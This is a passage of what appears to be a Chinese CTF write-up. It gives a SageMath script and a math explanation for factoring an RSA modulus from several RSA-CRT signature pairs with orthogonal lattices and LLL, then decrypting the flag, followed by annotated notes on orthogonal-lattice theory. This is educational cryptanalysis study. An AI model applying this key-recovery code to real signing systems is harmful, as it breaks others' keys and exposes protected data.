w\\xa6\\xf2\\x87D\\xe3\\xf9Y\\xf5=\\xf0\\x0b\\xd9\\xea\\x89,+e\\x1e\\xb7m#\\x99\\xd1\\x87\\x17Z\\xed\\x1d\\xc8\\x97;\\xa0K\\x05.\\xaa&lt;\\xc6s\\xcf\\xa2\\xa2\\\\PO\\x12&amp;\\xb4\\x11\\xec\\xad\\x10\\xf8\\xf7\\xd1\\xd3_\\x80\\x17\\xe0\\x1eP\\x93\\xe3\\xc2\\x1e\\x03\\xea]^\\xc6a\\x9c\\xcb\\x90\\xbb\\x9f\\x8by\\xa5dhM\\xce\\xc7\\xbc\\xf7\\xafe\\xcf\\xc1\\xf1\\x18@\\x1e\\xe2\\xdb\\xfb\\xe4^\\xc8\\xe7\\x19\\xccnY\\xc6o\\x7fL\\x9fV\\xd4\\xc4\\x15\\xe8&#x27;</span>,</span><br><span class=\"line\">          ]</span><br><span class=\"line\">sig = [<span class=\"string\">b&#x27;\\t\\x8b\\xde\\x98\\x84\\x1d\\x9e\\xd4\\xa0\\xb7f\\xe0\\x05\\xb1\\xbd8\\xb9G\\xe3\\x0c\\x83\\x8a\\xe5\\xf0G7\\x12\\x1eT\\x85o-B\\xe4_\\xd2\\x04\\xd9:\\xab\\xdf\\xa1 \\x8f\\xedt+\\x0f\\xce\\xb5\\x90\\xaaK\\xf0U~v=\\x84\\xe7$G\\xf5\\xfb\\xd3ok~V\\x1a\\xec&amp;\\x15\\x18Y\\x0c\\x80u\\xafF\\xf1\\x10\\x9f\\xf2\\xe6\\xa6\\x9a\\xbb\\xbd+\\xa4l\\xa9\\x11\\xd5\\t\\x13\\x16\\xa3\\xde\\xe1\\xdfZ\\xa9$r\\xb5`\\xc9&quot;\\x11\\xab\\xc5\\x87\\xc4\\x1d@\\x9e\\xa4t\\xdb#\\xbdj\\xcb\\x95\\xefK&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;z/\\xd6\\xfb\\xd8\\xfa\\xc4\\xed\\xbd\\x99\\xd0\\xa0\\x90\\xcb\\xca\\x83\\xd8B\\xa7\\xf4\\xbd\\xe0\\xc2&amp;\\x1aQl(\\xd6p\\x8f\\x89=tT\\xf1(\\xeb\\xab\\x84[oR\\x1fl=\\xda\\xf5\\x18q\\x8f\\xa7k\\x00\\x1b\\x1a\\x0ei\\x1fa.ho\\x15\\x04\\x12\\xe4\\xc2\\xd7\\x19\\x92\\xc3\\x9b\\xfe\\xd5\\xb6R\\xf8\\x95\\x9fr\\x93\\xddD\\x1c[\\x873\\xd5\\x06\\x1b\\xa5\\x82/6\\x9a\\x13\\xcf\\xa4\\xcd\\x0e]\\t\\xad?\\xd6\\x84\\r\\x90\\xef\\x86\\xf15)\\xe34\\xf7\\xb77\\xef\\x0c&amp;\\xdb8\\xa6\\xe0\\xa5a&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;U\\x0b\\xf6\\x9cm])1\\xe2\\xad\\xf9G\\x8f\\xa2\\xbc&#125;\\xd7\\x18\\x89\\xa4\\xfdFQ\\x80m&quot;\\xf9\\to^\\xd9A\\x98\\xd2\\xca\\x1e(b\\xa8\\xbe\\xc2m\\xf7\\n[O\\x00\\xbc\\x87\\x17\\xed\\x0cG\\xf2=H\\x0e\\xc0\\x14+\\xcb\\xd0\\x1feT2\\xf2Th\\xec\\xc2\\xcf&gt;6,&lt;\\x88X\\x8f\\xe9g\\xa8\\x00\\xafr\\x05\\x95\\rj\\x9c\\xc6\\n\\xbb\\x8a\\x019\\xc1\\x1ef#\\x02[Rh\\xd8\\xdc|&#123;6\\xeb\\xe8U\\x91\\xa4\\xeb&#125;\\xf4s;E\\xe72$i\\xdft\\xff\\&#x27;&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;[\\x94\\x95T\\xf4\\xc4\\xca\\x8drO\\x80\\x14\\xc9&lt;H\\xa2a\\xdc\\xf4`\\xac&gt;\\xab\\x03\\xfa\\x80Sx\\x99\\x14\\x83$U\\x0b\\xfa\\x8fv\\xfd\\xda\\x1a\\xa0\\xebY\\xaa\\x01\\xe2XsG\\t\\xcf\\xae\\xa0\\xbf\\x82iG\\tQ \\xb1\\xfe\\xa5k\\x12\\xd9\\x12\\xf7\\x95\\xa3\\xa5\\x8d`z\\x19\\x1a\\x90-\\x9aj\\x15\\xf6f&gt;\\x18\\x08\\xb8\\x1f\\x88\\x1a\\x80Th\\xd0\\x15\\x9bw#\\&#x27;`K\\xa5\\xf1\\xbf&quot;\\xe79\\xaf\\xc7z%p\\xa5\\x9f\\x14\\xef\\&#x27;1\\x11\\x05Gg\\xe9\\xda\\xc9\\x18~[&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&#x27;:\\xefRE\\xd7\\xa1?\\xf3\\xb5\\xf7\\xdd\\xe2\\xb6~\\x85014\\xc0\\x8a\\x80\\xe1\\xb5#\\x94\\x10\\xb2\\xa0\\xfe\\x87\\xd1t\\xc3$&amp;\\xde8\\x195\\xcd\\xf4@3\\x15\\xcaK\\xcc\\xcd\\r:\\x83*\\xd7l\\xb6\\xf2&#125; \\tJ\\xb5xKfjh.\\xfb\\xb5\\x91\\xc6\\xf2x\\x8e\\x83\\xdc\\xc3\\xef\\x8b\\x8dW\\xa6\\xa6\\xb0w\\xd8\\xf2G\\xa5-\\xc3\\x87\\x17;\\xedH`:\\xcd\\x08ts\\x9eqPE\\xd7\\xfc\\xc4\\x98\\xb5\\xe0\\xad\\xb7A\\x7f\\xcb\\x01\\xbd\\x98\\xd3Ea\\xb9\\x07\\x80\\xf8\\x19&#x27;</span>,</span><br><span class=\"line\">       <span class=\"string\">b&quot;8\\xca\\x7f!;\\\\\\xde\\x1b\\x80i\\x9b!\\x1c??u\\x13\\x955\\xd0xG\\xff\\xd7\\xba\\xfe+\\x95\\x0eu^\\x15\\x1a\\x0e*\\xfe\\x8a\\xafM\\xc0\\xd1Ty\\xd7\\xf1\\xa7@\\xd6\\xa6\\xee\\x0c:It\\x1a\\xeag\\xfc\\x0c\\xaf\\x02&lt;\\x03T)\\xeb\\xb0\\x15\\x1cz\\x85\\x992\\xa9\\xbe\\x9bm\\xc4D\\x83\\xf7\\xb5T\\xdd9?\\x94\\xd4\\x13\\xb4\\xb3\\x8d\\xa9\\x92\\x9dt\\x86\\xdb\\x0b$\\x19l\\xb1\\xb9\\x05&#x27;o\\xf3!\\t\\x01\\x93&#x27;z\\x15P\\x88\\xd7iN\\n\\x8bA\\xb5\\xd2&#125;\\xe8\\x10&quot;</span></span><br><span class=\"line\">       ]</span><br><span class=\"line\">n = <span class=\"number\">99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729</span></span><br><span class=\"line\">N = <span class=\"number\">81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731</span></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\">enc = <span class=\"number\">2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    _d, _n = B.nrows(), B.ncols()</span><br><span class=\"line\">    _c = <span class=\"number\">2</span> ** <span class=\"built_in\">min</span>(((_n-<span class=\"number\">1</span>)/<span class=\"number\">2</span>+(_n-_d)*(_n-_d-<span class=\"number\">1</span>)/<span class=\"number\">4</span>), <span class=\"number\">20</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> B:</span><br><span class=\"line\">        _c *= b.norm()</span><br><span class=\"line\">    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))</span><br><span class=\"line\">    B_r = B_bot.transpose().LLL()</span><br><span class=\"line\">    LB = B_r.matrix_from_rows_and_columns(<span class=\"built_in\">range</span>(_n-_d), <span class=\"built_in\">range</span>(_d, _n+_d))</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (B*LB.transpose()).is_zero()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">v = [crt([bytes_to_long(co_sig[i]), bytes_to_long(sig[i])], [N, n])</span><br><span class=\"line\">     <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">Lv = orthogonal_lattice(matrix(ZZ, v))</span><br><span class=\"line\"></span><br><span class=\"line\">result = orthogonal_lattice(Lv.matrix_from_rows(<span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">6</span>-<span class=\"number\">2</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> combinations(result, <span class=\"number\">2</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(-<span class=\"number\">10</span>, <span class=\"number\">10</span>)):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">10</span>, <span class=\"number\">10</span>):</span><br><span class=\"line\">            z = a*x+b*y</span><br><span class=\"line\">            <span class=\"keyword\">if</span> z.norm() &gt; sqrt(<span class=\"number\">6</span>*n):</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                vv = vector(v)-z</span><br><span class=\"line\">                <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> vv:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> gcd(i, n) != <span class=\"number\">1</span>:</span><br><span class=\"line\">                        p = gcd(i, n)</span><br><span class=\"line\">                        <span class=\"keyword\">assert</span> n % gcd(i, n) == <span class=\"number\">0</span></span><br><span class=\"line\">                        q = n//p</span><br><span class=\"line\">                        phi = (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">                        d = inverse_mod(e, phi)</span><br><span class=\"line\">                        m = long_to_bytes(<span class=\"built_in\">int</span>(<span class=\"built_in\">pow</span>(enc, d, n)))</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(m)</span><br><span class=\"line\">                        exit()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>RSA-CRT签名中计算了：<br>$$<br>\\sigma_p=\\mu(m)^d\\mod \\ p \\\\  \\sigma_q=\\mu(m)^d\\mod \\ q<br>$$<br>然后签名 $\\sigma=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta$ ，其中 $\\alpha=q\\cdot(q^{-1}\\mod\\ p)$ ， $\\beta=p\\cdot(p^{-1}\\mod\\ q)$ 。<br>题目中给出 6 对签名，每对签名用 CRT 不难算出<br>$$<br>v=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta \\mod N\\cdot N’<br>$$<br>其中 $\\sigma_p$ 和 $\\sigma_q$ 和 $N/2$ 一个数量级， $\\alpha$ 和 $\\beta$ 又和 $N$ 一个数量级，故右式远小于 $N\\cdot N’$ ，那么<strong>上式在整数域上是成立的</strong>。<br>一对算不出，但是多对可以，组成向量，有：<br>$$<br>\\boldsymbol{v}=\\alpha\\boldsymbol{x}+\\beta\\boldsymbol{y}<br>$$<br>其中 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 是分量 $n/2$ 位的未知向量， $\\alpha$ 和 $\\beta$ 是有关 $p$ 和 $q$ 的 CRT 系数。<br>不难计算出一组与 $\\mathbb{Z}^\\ell$ 中正交于 $\\boldsymbol{v}$ 的向量的格 $\\boldsymbol{v}^\\bot \\in \\mathbb{Z}^\\ell$ 的约化基 ${\\boldsymbol{b}_1,…,\\boldsymbol{b}_{\\ell-1}}$ 。（可能此时你会疑惑为什么是 ${\\ell-1}$ 个向量，下面的拓展里有解释）<br>特别地，我们有：<br>$$<br>\\alpha \\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle + \\beta \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0 \\quad \\mathrm{for} \\ j=1,2,\\ldots,\\ell-1<br>$$<br><del>（也不是很特别的感觉）</del><br>现在观察方程 $\\alpha\\cdot u+\\beta\\cdot v=0$ ，最小的非零解 $(u,v)\\in \\mathbb{Z}^2$ 是 $\\pm(\\beta,-\\alpha)/g$ ，其中 $g=\\gcd(\\alpha,\\beta)$ 盲猜是非常小的（经测试基本在10以内），意味着 $|u|,|v|\\geq\\mathit{\\Omega}(N)$ 中 $\\mathit{\\Omega}$ 常量是非常小的。（啥玩意？）对 $j=1,2,\\ldots,\\ell-1$ ，有以下两种可能：</p>\n<p><strong>情形1</strong>：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle = \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0$ 。此时 $\\boldsymbol{b}_j$ 属于 $\\mathbb{Z}^\\ell$ 中与 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 正交的向量的格 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$</p>\n<p><strong>情形2</strong>：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle$ 和 $\\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle$ 有绝对值 $\\geq \\mathit{\\Omega}(N)$ ，其中 $\\mathit{\\Omega}(N)$ 是一个小常数。因为 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 的范数都不超过 $\\sqrt{\\ell N}$ ，由柯西-施瓦茨不等式，这意味着 $||\\boldsymbol{b}_j||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$</p>\n<p>因为格 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 的秩是 $\\ell-2$ ，当全部 $\\ell-1$ 个向量 $\\boldsymbol{b}_j$ 线性无关时情形1不成立，所以最长的 $\\boldsymbol{b}_{\\ell-1}$ 应该在情形2中，因此 $||\\boldsymbol{b}_{\\ell-1}||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$ 。另一方面，其他向量形成一个秩为 $\\ell-2$ 的格，且体积<br>$$<br>V=\\mathrm{vol}(\\mathbb{Z}\\boldsymbol{b}_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2})\\approx\\frac{\\mathrm{vol}(\\boldsymbol{v}^\\bot)}{||\\boldsymbol{b}_{\\ell-1}||}=\\frac{||\\boldsymbol{v}||}{||\\boldsymbol{b}_{\\ell-1}||}\\leq \\frac{\\sqrt{\\ell}\\cdot N^{3/2}}{\\mathit{\\Omega}(\\sqrt{N/\\ell})}=O(\\ell N)<br>$$<br>盲猜是一个随机的格。特别地，我们有：<br>$$<br>||\\boldsymbol{b}_j||=O(\\sqrt{\\ell-2}\\cdot V^{1/(\\ell-2)})=O(\\ell^{1/2+1/(\\ell-2)}\\cdot N^{1/(\\ell-2)})\\quad\\mathrm{for} \\ j=1,2,\\ldots,\\ell-2<br>$$</p>\n<p>一旦 $\\ell \\geq 5$ ，这个长度就远小于 $\\sqrt{N/\\ell}$ 。假设是这种情况，那么对于 $j=1,2,…,\\ell-2$ ， $\\boldsymbol{b}_j$ 应该是情形1中。这意味着这些向量生成 $L={\\boldsymbol{x},\\boldsymbol{y}}^\\bot$ 中一个满秩的子格 $L’=\\mathbb{Z}\\boldsymbol{b}_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2}$ 。<br>取正交格，我们得到 $(L’)^\\bot \\supset L^\\bot=\\mathbb{Z}\\boldsymbol{x}\\oplus\\mathbb{Z}\\boldsymbol{y} $。因此， $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 属于 $L’$ 的正交格 $(L’)^\\bot$ 。令 ${\\boldsymbol{x’},\\boldsymbol{y’}}$ 为一组该格的约化基，我们可以枚举 $(L’)^\\bot$ 中的长度不超过 $\\sqrt{\\ell N}$ 且为 $\\boldsymbol{x’}$ 和 $\\boldsymbol{y’}$ 线性组合的所有格向量。高斯启发式表明这大约为：<br>$$<br>\\frac{\\pi(\\sqrt{\\ell N})^2}{\\mathrm{vol}((L’)^\\bot)}=\\frac{\\pi\\ell N}{V}=O(1)<br>$$<br>这样的向量，所以这肯定是可行的。对这些向量 $\\boldsymbol{z}$ ，我们计算 $\\gcd(\\boldsymbol{v}-\\boldsymbol{z},N)$ 。我们将因此很快在其中找到 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)$ ，因为 $\\boldsymbol{x}$ 是一个 $(L’)^\\bot$ 中长度 $\\leq\\sqrt{\\ell N}$ 的向量。但根据 $\\boldsymbol{v}$ 的定义，我们有：<br>$$<br>\\boldsymbol{v}=\\boldsymbol{x}\\mod p\\\\<br>\\boldsymbol{v}=\\boldsymbol{y}\\mod q<br>$$<br>故 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)=p$ ，从而分解 $N$ 。</p>\n<h3 id=\"拓展阅读-正交格\"><a href=\"#拓展阅读-正交格\" class=\"headerlink\" title=\"拓展阅读-正交格\"></a>拓展阅读-正交格</h3><p>令 $\\mathbf{b}_1,…,\\mathbf{b}_d$ 为 $\\mathit{\\Lambda}$ （这玩意念Lambda）中的向量。如果这 $d$ 个向量在 $\\mathbf{Z}$ 上线性无关且 $\\mathit{\\Lambda}$ 中的任意元素可以由 $\\mathbf{b}_i$ 整系数线性表出，则这 $d$ 个向量形成 $\\mathit{\\Lambda}$ 中的一组基。 $\\mathit{\\Lambda}$ 中至少存在一组基。 $\\mathit{\\Lambda}$ 的基都有相同的基数，称为 $\\mathit{\\Lambda}$ 的维度。</p>\n<p>如果 $\\mathit{\\Omega}$ 包含 $\\mathit{\\Lambda}$ ，且两者有相同的维度，则称 $\\mathit{\\Lambda}$ 为 $\\mathit{\\Omega}$ 在 $\\mathbf{Z}^n$ 上的一个子格。（子格的定义？） $\\mathit{\\Lambda}$ 的所有基张成相同的 $\\mathbf{Q}^n$ 的 $Q$ 向量子空间（啥玩意？），记为 $E_{\\mathit{\\Lambda}}$ 。 $\\mathbf{Q}^n$ 上 $E_{\\mathit{\\Lambda}}$ 的维度与 $\\mathit{\\Lambda}$ 的维度相同。令格 $\\overline{\\mathit{\\Lambda}}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 。 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 的一个子格。如果 $\\mathit{\\Lambda}=\\overline{\\mathit{\\Lambda}}$ ，那么我们称 $\\mathit{\\Lambda}$ 是一个完备格，特别的， $\\overline{\\mathit{\\Lambda}}$ 是一个完备格。</p>\n<blockquote>\n<p>笔者注记：<br>这里首先将 $\\mathit{\\Lambda}$ 张成一个<strong>有理数空间</strong>，不局限于<strong>整系数</strong>向量组合了，记为 $E_{\\mathit{\\Lambda}}$ 的E我猜是<strong>欧几里得</strong>的意思？然后与 $\\mathbf{Z}^n$ 相交得到的是整数点集合 $\\overline{\\mathit{\\Lambda}}$ ，如此 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 子格的事应该挺自然的。然后如果两者相等，想象一下，都那样张成了都找不到新的点，那这个格确实也挺完备。<br>PS:发现自己念了十年的欧几里得，难怪输入法打不出来（）</p>\n</blockquote>\n<p>令 $(\\mathbf{x},\\mathbf{y})\\rightarrow\\mathbf{x}.\\mathbf{y}$ 为一般意义上的欧里几德内积， $||.||$ 是它对应的范数 <del>（奇怪的表示方法）</del>。令 $F=(E_{\\mathit{\\Lambda}})^-$ 是关于该内积的正交向量子空间。我们定义正交格 $\\mathit{\\Lambda}^-=F\\cap\\mathbf{Z}^n$ 。因此， $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格，其维度为 $n-d$ 。这意味着 $(\\mathit{\\Lambda}^-)^-$ 等于 $\\overline{\\mathit{\\Lambda}}$ 。令 $\\mathcal{B}=(\\mathbf{b}_1,…,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基。</p>\n<blockquote>\n<p>笔者注记：<br>看到这就有点迷糊了，捋一捋： $E_{\\mathit{\\Lambda}}$ 是 $\\mathit{\\Lambda}$ 张成出的有理空间，然后 $F$ 是其正交向量子空间，即<strong>任意从 $\\mathit{\\Lambda}$ 和 $F$ 分别抓两个向量出来，其内积都为 $0$</strong> 。<br>再然后 $\\mathit{\\Lambda}^-$ 是 $F$ 的一个子格，<strong>注意到 $\\mathit{\\Lambda}^-$ 把 $F$ 所有整数点都框进去了</strong>，这就很有意思了，由上面的定义就不难得出正交格 $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格。<br>至于其维度为何是 $n-d$ ，有个概念叫<strong>正交补</strong>，就是正交空间的维数是刚刚好的，对于列空间维数为 $r$ 的矩阵 $A_{r\\times m}$ ，其左零空间的维数是 $m-r$ ，相加恰好为 $m$ 。举例来说，三维中与线正交的是二维空间，与面正交的是一维空间。<br>这篇 paper 习惯用 $E^-$ 表示正交向量子空间，但似乎 $E^\\bot$ 的写法较为广泛。</p>\n</blockquote>\n<p>在 $\\mathbf{Z}^n$ 的正则基上解析每个 $\\mathbf{b}_j$ 如下：</p>\n<p>$$<br>\\mathbf{b}_j =<br>\\begin{pmatrix}<br>b_{1,j} \\\\<br>b_{2,j} \\\\<br>\\vdots \\\\<br>b_{n,j}<br>\\end{pmatrix}<br>$$<br>（这里吐槽一下，由于下划线和 Markdown 语法有冲突，如果不加反斜杠， $b_j$ 写成 $\\mathbf{b}_j$ Latex 就会炸，下文一开始也炸了几回，弄了几次才发现是这问题）</p>\n<p>定义整数 $n\\times d$ 的整数矩阵 $B=(b_{i,j})_{1\\leq i\\leq n,1\\leq j\\leq d}$ ，格 $\\mathit{\\Lambda}$ 由 $B$ 的列向量张成，我们称 $\\mathit{\\Lambda}$ 由 $B$ 张成。令 $Q={^tB}B$ 为 $d\\times d$ 的对称 Gram 矩阵。 $Q$ 的行列式是与 $\\mathcal{B}$ 无关的正整数。 $\\mathit{\\Lambda}$ 的行列式被定义为 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(B)}$ 。</p>\n<blockquote>\n<p>笔者注记：<br>这是的 ${^tB}$ 应该是 $B^T$ 的意思，又是奇怪的写法（）<br>至于 Gram 矩阵，中文音译为格拉姆矩阵，对 $n$ 维欧氏空间上的 $k$ 个向量，其 Gram 矩阵为<br>$$<br>\\triangle(\\mathbf{v}_1,\\dots,\\mathbf{v}_k) =<br>\\begin{pmatrix}<br>\\langle\\mathbf{v}_1,\\mathbf{v}_1\\rangle &amp; \\cdots &amp; \\langle\\mathbf{v}_1,\\mathbf{v}_k\\rangle \\\\<br>\\vdots &amp; \\ddots &amp; \\vdots \\\\<br>\\langle\\mathbf{v}_k,\\mathbf{v}_1\\rangle &amp; \\cdots &amp; \\langle\\mathbf{v}_k,\\mathbf{v}_k\\rangle<br>\\end{pmatrix}<br>$$<br>不难看出这个可以等价表示为 $V^T\\times V$ ，得出的矩阵也显然是对称的。<br>这里 $\\mathit{\\Lambda}$ 不是一个方阵，故不能直接求出其行列式，那么就应该通过其 Gram 矩阵来求行列式，这里我觉得应该是 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(Q)}$ ，但我不确定。</p>\n</blockquote>\n<p><strong>定理1</strong> 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的完备格，那么 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。<br>证明：我们有 $\\mathit{\\Lambda}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 和 $\\mathit{\\Lambda}^-=E_{\\mathit{\\Lambda}}^-\\cap\\mathbf{Z}^n$ 。从另一篇论文（我也没读过）我们知道：<br>$$<br>\\det(\\mathbf{Z}^n)=\\frac{\\det(E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n)}{\\det((E_{\\mathit{\\Lambda}}^-)\\cap(\\mathbf{Z}^n)^*)}<br>$$<br>其中 $(\\mathbf{Z}^n)^*$ 表示 $\\mathbf{Z}^n$ 上的极格。但 $\\det(\\mathbf{Z}^n)=1$ （？为什么要说但呢？）且 $(\\mathbf{Z}^n)^*=\\mathbf{Z}^n$ ，故 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。</p>\n<p><strong>推论2</strong> 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的格，那么 $\\det((\\mathit{\\Lambda}^-)^-)=\\det(\\mathit{\\Lambda}^-)=\\det(\\overline{\\mathit{\\Lambda}})$ 。</p>\n<p><strong>定理3</strong> 令 $(\\mathbf{b}_1,…,\\mathbf{b}_d)$为格$\\mathit{\\Lambda}$ 在 $\\mathbf{Z}^n$ 上的一组 LLL 约化基，那么：</p>\n<ol>\n<li>$\\det(\\mathit{\\Lambda})\\leq \\prod^d_{i=1}||\\mathbf{b}_i||\\leq 2^{d(d-1)/4}\\det(\\mathit{\\Lambda})$</li>\n<li>对任意线性无关的向量 $\\mathbf{x}_1,…,\\mathbf{x}_t\\in\\mathit{\\Lambda}$ ，当 $1\\leq j \\leq t$ 时，有：<br>$$<br>||\\mathbf{b}_j||\\leq 2^{(d-1)/2}\\max(||\\mathbf{x}_1||,…,||\\mathbf{x}_t||)<br>$$</li>\n</ol>\n<p>我们现在描述计算正交格的一组 LLL 约化基的基本方法。令 $\\mathcal{B}=(\\mathbf{b}_1,…,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基， $B=(b_{i,j})$ 为其对应的 $n\\times d$ 的矩阵。令 $c$ 为一个正整数常量。定义 $\\mathit{\\Omega}$为$\\mathbf{Z}^{n+d}$ 上由以下 $(n+d)\\times n$ 矩阵张成的格。</p>\n<p>$$<br>B^-=<br>\\begin{pmatrix}<br>c\\times b_{1,1} &amp; c\\times b_{2,1} &amp; \\cdots &amp; c\\times b_{n,1} \\\\<br>c\\times b_{1,2} &amp; c\\times b_{2,2} &amp; \\cdots &amp; c\\times b_{n,2} \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>c\\times b_{1,d} &amp; c\\times b_{2,d} &amp; \\cdots &amp; c\\times b_{n,d} \\\\<br>1 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br>0 &amp; 1 &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 1<br>\\end{pmatrix}<br>$$<br>矩阵 $B^-$ 被分成两块：上面 $d\\times n$ 部分是 $c\\ {^tB}$ ，下面 $n\\times n$ 部分是单位阵。<br>设 $p_{\\uparrow}$ 和 $p_{\\downarrow}$ 是两个投影，将 $\\mathbf{Z}^{n+d}$ 的任何向量分别映射到由其前 $d$ 个坐标构成的 $\\mathbf{Z}^d$ 向量和由其最后 $n$ 个坐标构成的 $\\mathbf{Z}^n$ 向量，所有投影都与正则基有关。<del>（这段翻译累死我了）</del><br>令 $\\mathbf{x}$ 为 $\\mathit{\\Omega}$ 的一个向量并记 $\\mathbf{y}=p_{\\downarrow}(\\mathbf{x})$ ，那么</p>\n<p>$$<br>p_{\\uparrow}(\\mathbf{y})=<br>\\begin{pmatrix}<br>\\mathbf{y}.\\mathbf{b}_1 \\\\<br>\\vdots \\\\<br>\\mathbf{y}.\\mathbf{b}_d<br>\\end{pmatrix}<br>$$<br>因此，当且仅当 $p_{\\uparrow}(\\mathbf{x})=0$ 时有 $\\mathbf{y}\\in \\mathit{\\Lambda}^-$ 。此外，如果 $||\\mathbf{x}||\\leq c$ ，那么 $p_{\\uparrow}(\\mathbf{x})=0$ 。</p>\n<p><strong>定理4</strong> 令 $(\\mathbf{x}_1,\\mathbf{x}_2,…,\\mathbf{x}_n)$ 为格 $\\mathit{\\Omega}$ 的一组 LLL 约化基。若</p>\n<p>$$<br>c&gt;2^{(n-1)/2+(n-d)(n-d-1)/4}\\det(\\overline{\\mathit{\\Lambda}})<br>$$<br>则 $(p_{\\downarrow}(\\mathbf{x}_1),p_{\\downarrow}(\\mathbf{x}_2),…,p_{\\downarrow}(\\mathbf{x}_{n-d}))$ 为 $\\overline{\\mathit{\\Lambda}}$ 的一组 LLL 约化基。</p>\n<p>使用阿达马不等式，我们得到以下算法：</p>\n<p><strong>算法5</strong> 给定一组 $\\mathbf{Z}^n$ 上格 $\\mathit{\\Lambda}$ 的基 $(\\mathbf{b}_1,\\mathbf{b}_2,…,\\mathbf{b}_d)$ ，该算法计算一组 $\\overline{\\mathit{\\Lambda}}$ 的LLL约化基。</p>\n<ol>\n<li><p>选取 $c=\\lceil2^{(n-1)/2+(n-d)(n-d-1)/4}\\prod^d_{j=1}||\\mathbf{b}_j||\\rceil$</p>\n</li>\n<li><p>计算 $(n+d)\\times n$ 的整数矩阵 $B^-$ 和 $\\mathbf{b}_1,…,\\mathbf{b}_d$ 对应的 $n\\times d$ 矩阵 $B=(b_{i,j})$</p>\n</li>\n<li><p>计算由 $B^-$ 张成的格的一组 LLL 约化基 